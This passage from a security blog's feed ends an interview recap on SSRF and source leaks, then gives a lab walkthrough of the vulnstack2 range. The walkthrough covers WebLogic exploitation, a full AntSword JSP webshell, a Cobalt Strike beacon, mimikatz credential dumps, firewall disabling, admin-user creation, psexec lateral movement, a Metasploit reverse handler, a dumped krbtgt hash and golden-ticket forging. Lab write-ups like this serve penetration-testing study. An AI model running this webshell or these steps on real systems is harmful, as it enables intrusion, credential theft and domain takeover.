-<p>10.csrf和ssrf哪个危害更大一些？ssrf该如何防御</p>
-<p>ssrf可以内容读取，探测内网；csrf可以盗取cookie，然后我说应该是csrf吧（虽然知道他们的作用，但是还是拿不定主意）然后师傅有问了下才确定是ssrf危害大。</p>
-<p>然后问ssrf如何防御</p>
-<p>11.泄漏类题目有接触过吗，接触过哪些</p>
-<p>当时只想到了git泄漏，面试完突然想到了svn泄漏和DS_store泄漏</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.hg源码泄漏</span><br><span class="line">.git源码泄露</span><br><span class="line">.DS_Store泄漏</span><br><span class="line">svn泄漏</span><br></pre></td></tr></table></figure>
-
-<p>12.有什么问题要提问吗</p>
-<p>当时只想到了刚才问的sleep函数的替代函数….别的都想不起来了，大脑一片空白…….</p>
-<br>
-
-<hr>
-<p>感觉应该是凉凉了，面试挺突然的，没做啥准备，而且这个实习是比赛方面的，作为签到型选手几率更渺茫了…wuwuwu….先把红日靶场搞完，好好准备秋招了！</p>
-]]></content>
-      <categories>
-        <category>面试</category>
-      </categories>
-      <tags>
-        <tag>面试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>vulnstack2靶场</title>
-    <url>/posts/8a9ea0cb/</url>
-    <content><![CDATA[<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>统一登录密码 <code>1qaz@WSX</code></p>
-<p>Web密码错误的，在快照管理器里面选择转到1.3即可,默认为空，然后修改密码为统一密码</p>
-<p>然后再web主机上开启Weblogic服务</p>
-<p><img src="/posts/8a9ea0cb/start_weblogic.png"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dc    仅主机  10.10.10.10</span><br><span class="line">web   仅主机  10.10.10.80   NAT 192.168.0.80</span><br><span class="line">pc    仅主机  10.10.10.201  NAT 192.168.0.201</span><br><span class="line">kali  NAT     192.168.0.128</span><br></pre></td></tr></table></figure>
-
-<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="nmap扫描端口"><a href="#nmap扫描端口" class="headerlink" title="nmap扫描端口"></a>nmap扫描端口</h4><p>用kaliping不通web主机，应该是开启了防火墙禁止了icmp</p>
-<p><code>sudo nmap 192.168.0.80 -sV</code></p>
-<blockquote>
-<p>PORT      STATE SERVICE       VERSION<br>80/tcp    open  http          Microsoft IIS httpd 7.5<br>135/tcp   open  msrpc         Microsoft Windows RPC<br>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br>445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds<br>1433/tcp  open  ms-sql-s      Microsoft SQL Server 2008 R2 10.50.4000; SP2<br>3389/tcp  open  ms-wbt-server Microsoft Terminal Service<br>7001/tcp  open  http          Oracle WebLogic Server 10.3.6.0 (Servlet 2.5; JSP 2.1; T3 enabled)<br>49152/tcp open  msrpc         Microsoft Windows RPC<br>49153/tcp open  msrpc         Microsoft Windows RPC<br>49154/tcp open  msrpc         Microsoft Windows RPC<br>49155/tcp open  msrpc         Microsoft Windows RPC<br>49156/tcp open  msrpc         Microsoft Windows RPC</p>
-</blockquote>
-<p><img src="/posts/8a9ea0cb/nmap.png"></p>
-<p>先从7001的weblogic下手，使用WeblogicScan扫描一下是否存在漏洞</p>
-<p><img src="/posts/8a9ea0cb/weblogicscan.png"></p>
-<p>得到后台路径为<code>http://192.168.0.80:7001/console/login/LoginForm.jsp</code></p>
-<p>检测到存在<code>CVE20192725</code> 和 ssrf漏洞</p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="利用ssrf漏洞进行端口探测"><a href="#利用ssrf漏洞进行端口探测" class="headerlink" title="利用ssrf漏洞进行端口探测"></a>利用ssrf漏洞进行端口探测</h4><p>存在位置<code>http://192.168.0.80:7001/uddiexplorer/SearchPublicRegistries.jsp</code></p>
-<p>抓包测试</p>
-<p><img src="/posts/8a9ea0cb/ssrf1.png"></p>
-<p>此处的operator为可控点，输入一个存在的端口<code>127.0.0.1:7001</code> 会返回一个状态码</p>
-<p><img src="/posts/8a9ea0cb/ssrf_7001.png"></p>
-<p>输入一个不存在的端口时<code>192.168.0.80:1234</code> 会返回<code>but could not connect over HTTP to server</code></p>
-<p><img src="/posts/8a9ea0cb/ssrf_1234.png"></p>
-<p>输入<code>127.0.0.1:6379</code> 返回<code>but could not connect over HTTP to server</code>说明没有开放6379端口，没法继续利用去弹redis shell</p>
-<p><img src="/posts/8a9ea0cb/ssrf_6379.png"></p>
-<p><a href="https://www.cnblogs.com/bmjoker/p/9759761.html">weblogic ssrf利用</a></p>
-<h4 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h4><p>直接使用6哥师傅的java反序列化终极测试工具.</p>
-<p><img src="/posts/8a9ea0cb/java_tool1.png"></p>
-<p><img src="/posts/8a9ea0cb/java_tool2.png"></p>
-<p><a href="https://www.cnblogs.com/sstfy/p/10350915.html">weblogic上传木马时路径选择</a></p>
-<p>1.把shell写到控制台images目录中</p>
-<p><code>C:\Oracle\Middleware\wlserver_10.3\server\lib\consoleapp\webapp\framework\skins\wlsconsole\images\shell.jsp</code></p>
-<p>访问<code>http://*.*.*.*:7001/console/framework/skins/wlsconsole/images/shell.jsp</code></p>
-<p>2.写到uddiexplorer目录中</p>
-<p><code>C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\uddiexplorer\随机字符\war\shell.jsp</code></p>
-<p>访问<code>http://*.*.*.*:7001/uddiexplorer/shell.jsp</code></p>
-<p>3.写到应用安装目录中</p>
-<p><code>C:\Oracle\Middleware\user_projects\domains\application\servers\AdminServer\tmp\_WL_user\项目名\随机字符\war\shell.jsp</code></p>
-<p>访问<code>http://*.*.*.*:7001/项目名/shell.jsp</code></p>
-<p>上传蚁剑的jsp马。密码为ant</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    class U extends ClassLoader &#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            super(c);</span><br><span class="line">        &#125;</span><br><span class="line">        public Class g(byte[] b) &#123;</span><br><span class="line">            return super.defineClass(b, 0, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public byte[] base64Decode(String str) throws Exception &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class clazz &#x3D; Class.forName(&quot;sun.misc.BASE64Decoder&quot;);</span><br><span class="line">            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            Class clazz &#x3D; Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">            Object decoder &#x3D; clazz.getMethod(&quot;getDecoder&quot;).invoke(null);</span><br><span class="line">            return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String cls &#x3D; request.getParameter(&quot;ant&quot;);</span><br><span class="line">    if (cls !&#x3D; null) &#123;</span><br><span class="line">        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/posts/8a9ea0cb/uploade_shell.png"></p>
-<p>使用蚁剑进行连接</p>
-<p><img src="/posts/8a9ea0cb/ant_conn.png"></p>
-<p>然后可以使用<code>As-Exploits</code>插件</p>
-<p>发现该机器上有安装360</p>
-<h4 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h4><p>在CS上创建listener 生成cs.exe后使用蚁剑运行，beacon成功上线</p>
-<p><img src="/posts/8a9ea0cb/cs1.png"></p>
-<h5 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看当前用户sid  shell whoami &#x2F;user</span><br><span class="line">查看系统信息  shell systeminfo</span><br><span class="line">查看域名      shell net config workstation</span><br><span class="line">查看域内用户  shell net user &#x2F;domain</span><br><span class="line">查看机器信息  net computers </span><br><span class="line">查看域内主机  shell net view</span><br><span class="line">查看有几个域  shell net view &#x2F;domain</span><br><span class="line">查看域管理员  shell net group &quot;domain admins&quot; &#x2F;domain  </span><br><span class="line">查看域控      shell net group &quot;domain controllers&quot; &#x2F;domain  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><code>shell whoami /user</code></p>
-<p><img src="/posts/8a9ea0cb/cs_whoami_user.png"></p>
-<p><code>shell systeminfo</code></p>
-<p><img src="/posts/8a9ea0cb/cs_systeminfo.png"></p>
-<p><code>shell net config workstation</code></p>
-<p><img src="/posts/8a9ea0cb/cs_net_config_workstation.png"></p>
-<p><code>shell net user /domain</code></p>
-<p><img src="/posts/8a9ea0cb/cs_net_user_domain.png"></p>
-<p><code>net computers</code></p>
-<p><img src="/posts/8a9ea0cb/cs_net_computers.png"></p>
-<p>使用CS的portscan模块扫描域内主机端口</p>
-<p><img src="/posts/8a9ea0cb/cs_portscan.png"></p>
-<p>关闭防火墙<code>netsh advfirewall set allprofiles state off</code></p>
-<p><code>shell net view </code> 发现报错6118，在网上查了下是因为没有开启<code>Computer Brower</code>服务，去看了下，web服务器把该服务禁止了，开启后就可以正常使用了（因为刚才是的时候web服务器密码登录不上去，然后切换了快照，手动开启了web服务）</p>
-<p><img src="/posts/8a9ea0cb/cs_net_view.png"></p>
-<p><code>shell net group &quot;domain admins&quot; /domain</code></p>
-<p><code>shell net group &quot;domain controllers&quot; /domain </code></p>
-<p><img src="/posts/8a9ea0cb/cs_shell_net_group.png"></p>
-<p>使用CS的<code>run_mimikatz</code>模块</p>
-<p><img src="/posts/8a9ea0cb/cs_run_mimikatz.png"></p>
-<p>得到凭据信息，密码为<code>1qaz@WSX</code></p>
-<p><img src="/posts/8a9ea0cb/cs_credentials.png"></p>
-<h4 id="创建用户登录3389"><a href="#创建用户登录3389" class="headerlink" title="创建用户登录3389"></a>创建用户登录3389</h4><p>查看3389是否开放</p>
-<p><img src="/posts/8a9ea0cb/cs_nerstat_3389.png"></p>
-<p><img src="/posts/8a9ea0cb/cs_new_user.png"></p>
-<p>添加用户到管理员权限 <code>shell net localgroup administrators Mamor /add</code></p>
-<p><img src="/posts/8a9ea0cb/cs_net_localgroup_administrators_Mamor_add.png"></p>
-<p><code>sudo rdesktop 192.168.0.80:3389 </code> 使用 <code>Mamor</code> <code>1qaz@WSX</code>成功登录</p>
-<p><img src="/posts/8a9ea0cb/rdesktop.png"></p>
-<p>(注：这里的360防护好像没有起作用，没有进行拦截)</p>
-<h4 id="使用PSexec横向移动"><a href="#使用PSexec横向移动" class="headerlink" title="使用PSexec横向移动"></a>使用PSexec横向移动</h4><p>使用和上一个靶场一样的方法，创建一个smb监听器</p>
-<p>在Targets中 选择主机右键jump-&gt; psexec，选择票据</p>
-<p>然后得到如图，可以通过这种方法得到web机器的system权限</p>
-<p><img src="/posts/8a9ea0cb/cs_graph_view.png"></p>
-<p>成功拿到域控DC.</p>
-<h4 id="CS派生MSF"><a href="#CS派生MSF" class="headerlink" title="CS派生MSF"></a>CS派生MSF</h4><p>在CS中创建一个 Foreign HTTP listener</p>
-<p><img src="/posts/8a9ea0cb/cs_msf.png"></p>
-<p>在msf中</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">msf exploit(multi&#x2F;handler) &gt;  set payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">set &#x3D;&gt; payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; set lhost 192.168.0.128</span><br><span class="line">lhost &#x3D;&gt; 192.168.0.128</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; set lport 6666</span><br><span class="line">lport &#x3D;&gt; 6666</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; run</span><br></pre></td></tr></table></figure>
-
-<p><img src="/posts/8a9ea0cb/cs_msf_shell.png"></p>
-<p>msf添加路由</p>
-<p><img src="/posts/8a9ea0cb/msf_autoroute.png"></p>
-<p><img src="/posts/8a9ea0cb/route_print.png"></p>
-<p>配置代理，在proxychains4设置127.0.0.1 1080</p>
-<p><img src="/posts/8a9ea0cb/socks_proxy.png"></p>
-<h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><h5 id="域控信息收集"><a href="#域控信息收集" class="headerlink" title="域控信息收集"></a>域控信息收集</h5><p>在域控获取krbtgt账户的NTLM hash值和SID</p>
-<p><img src="/posts/8a9ea0cb/dc_hashdump.png"></p>
-<p><code>82dfc71b72a11ef37d663047bc2088fb</code></p>
-<p><img src="/posts/8a9ea0cb/dc_logonpasswords.png"></p>
-<p>SID <code>S-1-5-21-2756371121-2868759905-3853650604</code></p>
-<h5 id="黄金票据利用"><a href="#黄金票据利用" class="headerlink" title="黄金票据利用"></a>黄金票据利用</h5><p>黄金票据时伪造票据授予票据(TGT)</p>
-<p>利用需要的条件:</p>
-<p>1.域名称</p>
-<p>2.域的SID值</p>
-<p>3.域的KRBTGT账户NTLM密码哈希</p>
-<p>4.伪造用户名</p>
-<p>使用CS清除client端(域内其他机器)的票据</p>
-<p><code>kerberos_ticket_purge</code></p>
-<p><code>shell klist</code>查看票据信息是否已经被清除</p>
-<p><img src="/posts/8a9ea0cb/cs_shell_kilist.png"></p>
-<p>使用CS生成黄金票据</p>
-<p><img src="/posts/8a9ea0cb/cs_Golden_Ticket.png"></p>
-<p><img src="/posts/8a9ea0cb/cs_Golden_Ticket2.png"></p>
-]]></content>
-      <categories>
-        <category>vulnstack</category>
-      </categories>
-      <tags>
-        <tag>vulnstack</tag>
       </tags>
   </entry>
 </search>
